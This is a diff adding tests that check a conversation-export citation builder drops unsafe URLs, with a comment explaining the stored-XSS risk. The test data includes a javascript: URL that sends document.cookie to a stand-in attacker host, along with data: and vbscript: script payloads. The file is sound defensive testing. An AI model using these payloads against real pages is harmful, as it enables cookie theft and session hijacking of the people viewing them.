@@ -103,3 +103,49 @@ describe('buildCitations with no citations', () => {
     expect(result.text).toBe('Highlighted.');
   });
 });
+
+/** Every URL in an export is attacker-controlled and `Web/Sources.tsx` puts
+ * `link` straight into an `href`, where React 18 still emits `javascript:`.
+ * A shared conversation carries its search results verbatim, so an unfiltered
+ * link is stored XSS against every viewer of the share. */
+describe('buildCitations rejects unsafe citation urls', () => {
+  it.each([
+    'javascript:fetch("https://evil.tld/?c="+document.cookie)',
+    'data:text/html,<script>alert(1)</script>',
+    'vbscript:msgbox(1)',
+  ])('drops a %s reference entirely', (url) => {
+    const result = buildCitations(
+      assistant([webpage(url, 'Docs')]),
+      `Stay in Positano.${CITE}turn0search0`,
+    );
+
+    expect(result.citations).toEqual([]);
+    expect(JSON.stringify(result)).not.toContain('javascript:');
+    expect(JSON.stringify(result)).not.toContain('data:text/html');
+    expect(JSON.stringify(result)).not.toContain('vbscript:');
+  });
+
+  it('keeps the safe sources of a reference list that also carries an unsafe one', () => {
+    const result = buildCitations(
+      assistant([
+        {
+          type: 'grouped_webpages',
+          alt: null,
+          url: null,
+          title: null,
+          snippet: null,
+          attribution: null,
+          items: [
+            { title: 'Bad', url: 'javascript:alert(1)', snippet: null, attributions: null },
+            { title: 'Good', url: 'https://good.example/x', snippet: null, attributions: null },
+          ],
+        } as ChatGptContentReference,
+      ]),
+      `Stay in Positano.${CITE}turn0search0`,
+    );
+
+    const organic = result.citations[0]?.data.organic ?? [];
+    expect(organic).toHaveLength(1);
+    expect(organic[0].link).toBe('https://good.example/x');
+  });
+});
